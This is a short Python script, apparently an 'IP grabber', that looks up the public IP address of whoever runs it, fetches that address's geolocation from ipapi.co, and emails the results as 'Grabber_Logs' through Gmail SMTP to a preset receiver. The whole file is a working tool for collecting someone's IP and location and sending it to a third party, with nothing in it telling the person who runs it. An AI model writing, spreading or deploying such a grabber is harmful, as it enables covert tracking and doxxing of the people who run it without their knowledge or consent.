import requests
import json
import smtplib
import ssl
from email.message import EmailMessage
from requests import get

email_sender = '' #all about these variables is write in readme
email_password = ''
email_receiver = ''
ip = get('https://api.ipify.org').text
subject = "Grabber_Logs:  " + ip

r = requests.get("https://ipapi.co/" + ip + "/json")

em = EmailMessage()
em['From'] = email_sender
em['To'] = email_receiver
em['Subject'] = subject
em.set_content(json.dumps(r.json()))

context = ssl.create_default_context()
with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
    smtp.login(email_sender, email_password)
    smtp.sendmail(email_sender, email_receiver, em.as_string())